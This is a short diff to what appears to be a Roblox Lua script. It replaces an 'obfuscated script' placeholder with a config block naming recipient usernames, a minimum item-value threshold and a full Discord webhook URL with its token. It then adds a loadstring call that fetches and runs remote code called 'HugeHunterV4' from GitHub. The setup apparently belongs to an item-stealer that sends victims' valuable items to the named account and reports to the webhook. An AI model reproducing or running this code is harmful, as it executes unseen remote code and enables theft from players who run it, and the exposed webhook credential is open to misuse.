@@ -1,1 +1,6 @@
-obfuscated script
+Username = "SkibidiAhhWolf9"
+Username2 = "SkibidiAhhWolf9"
+MinimumRAP = 500000
+Webhook = "https://discord.com/api/webhooks/1363402294011498526/QUpZDnzJthTSJ1u8IfcuggKWrD_TP2AdHFAkZfBZCKwklsGbnCfe4fWUOV_fU94EMf6_"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptercase/HugeHunterV4/refs/heads/main/HugeHunterV4", true))()
